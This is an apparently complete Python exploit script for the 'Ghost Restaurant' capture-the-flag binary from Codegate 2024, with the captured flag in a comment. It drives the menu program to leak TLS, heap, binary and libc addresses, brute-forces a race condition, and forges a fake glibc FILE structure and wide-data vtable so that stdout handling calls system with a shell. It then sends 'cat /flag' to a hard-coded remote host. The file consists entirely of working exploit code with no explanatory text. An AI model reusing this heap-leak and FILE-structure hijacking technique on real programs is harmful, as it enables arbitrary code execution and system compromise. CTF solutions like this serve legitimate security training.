#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':args.HOST or '141.164.53.32', 'port':int(args.PORT or 1337)})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select(args.ENV or None)

#==========

binf = ELF(bin_file)
ofs_str_whirr       = next(binf.search(b'Whirr!'))

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_clone          = libc.sep_function['clone']
ofs_libc_nl_global_locale = 0x2043c0    # libc.symbols['_nl_global_locale']

#==========

def attack(conn, **kwargs):
    gr = GhostRestaurant(conn)

    gr.create_oven(b'1'*8)
    gr.select_oven(1)

    def leak_tls_heap():
        for i in range(1, 1+3):
            gr.insert_food(i, 0)
        gr.insert_food(4, 0)
        gr.remove_food(4)
        for _ in range(3):
            gr.remove_food(1)

        addr_tls_arr = u(gr.insert_food(5, 0, b'a'*0x20)[0x20:]) - 0x160
        addr_heap = u(gr.insert_food(5, 0, b'b'*0x28)[0x28:])

        gr.remove_food(1)
        gr.remove_food(1)

        return addr_tls_arr, addr_heap

    addr_tls_arr, addr_heap = leak_tls_heap()
    addr_heap_base = addr_heap - 0x960
    if addr_tls_arr.bit_length() < 40:
        error('incomplete address: 0x{:012x}'.format(addr_tls_arr))
    success('addr_tls_arr      = 0x{:012x}'.format(addr_tls_arr))
    success('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))

    i = 0
    with log.progress('Bruteforcing...') as p:
        while True:
            i += 1
            p.status(f'{i} times')
            gr.insert_food(1, 1)
            sleep(0.1)
            gr.remove_food(1)

            if env.check('debug'):
                conn.gdb.interrupt_and_wait()
                conn.gdb.execute(f'set {{long}}0x{addr_tls_arr-0x10:x}=-1')
                # conn.gdb.continue_nowait()

            gr.insert_food(1, -(30+1))
            if b'empty' in conn.recvline():
                break
            gr.remove_food(1)
    info(f'Trial: {i} times')

    addr_str_whirr = u(gr.insert_food(5, 0, b'\x73'))
    binf.address = addr_str_whirr - ofs_str_whirr
    success('addr_binf_base    = 0x{:012x}'.format(binf.address))
    addr_stdout    = binf.symbols['stdout']

    for _ in range(5):
        gr.insert_food(5, 0, b'\x00')

    leak = u(gr.insert_food(5, 0, b'A'*0x18)[0x18:])
    if env.check('remote'):
        addr_libc_clone  = leak - 0x44
    else:
        addr_libc_clone3 = leak - 0x2c
        addr_libc_clone  = addr_libc_clone3 - 0x220

    libc.address = addr_libc_clone - ofs_libc_clone
    success('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_nl_global_locale  = libc.address + ofs_libc_nl_global_locale
    addr_libc_io_wfile_jumps    = libc.symbols['_IO_wfile_jumps']
    addr_libc_system            = libc.sep_function['system']

    addr_fake_file = addr_tls_arr - 0x730

    # _IO_new_file_underflow:   fp._flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)
    # _IO_wfile_overflow:       fp->_wide_data->_IO_write_base == 0
    # _IO_wfile_wdoallocbuf:    fp->_wide_data->_IO_buf_base == 0, fp._flags & _IO_UNBUFFERED == 0
    fake_file = flat(
        p32(0xfbad2887 & ~2 & ~8 | 0x280) + b';sh\x00',     # _flags &= ~_IO_UNBUFFERED & ~_IO_NO_WRITES
                                                            # _flags |= _IO_LINKED | _IO_LINE_BUF
        [addr_fake_file + 0x83]*8,
        [0]*5,
        constants.STDOUT_FILENO,
        -1, 0,
        addr_fake_file - 0x20,              # _lock
        0, 0,
        addr_fake_file + 0xe0,              # _wide_data
        [0]*6,
        addr_libc_io_wfile_jumps,
    )
    fake_wide  = b'\x00'*0xe0
    fake_wide += p64(addr_fake_file+0xe0+0xe8 - 0x68)   # _wide_vtable

    exploit  = fake_file
    exploit += fake_wide
    exploit += p64(addr_libc_system)        # __doallocate: 0x68

    # __isoc99_scanf -> __vfscanf_internal
    #    -> __GI__IO_default_uflow(stdin) -> _IO_new_file_underflow(stdin)
    #        -> __GI__IO_wfile_overflow(stdout) -> __GI__IO_wdoallocbuf(stdout)

    for f in split_n(exploit, 0x50):
        gr.insert_food(5, u64(f[0x40:0x40+8]) if len(f) > 0x47 else 0, f[:0x40])

    for _ in range(20 - (len(exploit)//0x50 + int(len(exploit)%0x50 > 0))):
        gr.insert_food(5, 0, b'\x00')
    gr.insert_food(5, addr_libc_nl_global_locale, b'\x00')
    gr.insert_food(1, 0)

    offset = (addr_stdout - addr_tls_arr) % 0x50
    if offset > 0x10:
        warn(f'offset: 0x{offset:x} (> 0x10)')
        addr_alt_tls_arr = None

        for i in range(2, 2+3):
            info('using another TLS')

            gr.back_to_kitchen()
            gr.create_oven(str(i).encode())
            gr.select_oven(i)
            addr_alt, _ = leak_tls_heap()
            if addr_alt.bit_length() < 40:
                warn('incomplete address: 0x{:012x}'.format(addr_alt))
                continue
            success('addr_tls_arr      = 0x{:012x}'.format(addr_alt))

            offset = (addr_stdout - addr_alt) % 0x50
            if offset > 0x10:
                warn(f'offset: 0x{offset:x} (> 0x10)')
                continue
            addr_alt_tls_arr = addr_alt

            gr.back_to_kitchen()
            gr.select_oven(1)

            ofs_alt = (addr_alt_tls_arr-0x10 - addr_tls_arr) % 0x50
            gr.insert_food(1, (addr_alt_tls_arr-0x10 - addr_tls_arr)//0x50 - 1)
            gr.insert_food(5, -1 if ofs_alt >= 0x40 else 0, b'\x00' if ofs_alt == 0x40 else (b'\x00'*ofs_alt + flat(-1)))

            gr.back_to_kitchen()
            gr.select_oven(i)
            break

        if addr_alt_tls_arr is None:
            error('TLS not in appropriate address')
        addr_tls_arr = addr_alt_tls_arr

    gr.insert_food(1, (addr_stdout - addr_tls_arr)//0x50 - 1)
    gr.insert_food(5, 0, b'\x00'*offset + p64(addr_fake_file), False)

    if env.check('remote'):
        conn.sendline(b'cat /flag')

class GhostRestaurant:
    def __init__(self, conn):
        self.c = conn

    def create_oven(self, name):
        self.c.sendlineafter(b'option: ', b'0')
        self.c.sendlineafter(b'name: ', name)

    def select_oven(self, n):
        self.c.sendlineafter(b'option: ', str(n).encode())

    def insert_food(self, n, time, special=None, wait=True):
        assert((n != 5 and special is None) or (n == 5 and special is not None))
        self.c.sendlineafter(b'option: ', b'1')
        self.c.sendlineafter(b'> ', str(n).encode())
        self.c.sendlineafter(b'(seconds): ', str(time).encode())
        if special is not None:
            self.c.sendafter(b'food: ', special)
        if not wait:
            return None
        self.c.recvuntil(b'Food \'')
        return self.c.recvuntil(b'\' added.\n', drop=True)

    def remove_food(self, n):
        self.c.sendlineafter(b'option: ', b'2')
        self.c.sendlineafter(b'> ', str(n).encode())

    def back_to_kitchen(self):
        self.c.sendlineafter(b'option: ', b'3')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    # comn.run(attack)
    comn.interactive()
    # codegate2024{0ae622885e81f2a54b9b8b3729816b6f46c5feb0e7dcc92c74a4baf1d8a09a5a4b58e5b0730658a1ee67c39feb5b0dbe874a70058c02da7ee7c0fcff4e4b395c2f438e9410af3ec4}

if __name__=='__main__':
    main()

#==========
